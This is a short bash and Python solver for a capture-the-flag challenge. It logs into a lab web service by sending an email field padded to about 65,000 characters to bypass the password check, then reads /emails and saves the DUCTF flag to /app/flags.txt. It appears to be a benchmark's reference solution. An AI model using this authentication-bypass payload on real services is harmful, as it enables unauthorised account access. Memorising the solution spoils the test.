#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import pathlib
import re

import requests

target = "http://target:8114"
payload = {
    "email": "mc-fat@monke.zip" + ("z" * 8) + "t" + ("A" * ((1 << 16) - 9)),
    "password": "anything",
}

login = requests.post(f"{target}/login", json=payload, timeout=30)
login.raise_for_status()
token = login.json()["token"]

emails = requests.get(
    f"{target}/emails",
    headers={"X-Auth-Token": token},
    timeout=30,
)
emails.raise_for_status()
match = re.search(r"DUCTF\{[^}\n]+\}", emails.text)
if not match:
    raise SystemExit("flag not found in /emails response")

pathlib.Path("/app/flags.txt").write_text(match.group(0) + "\n")
PY
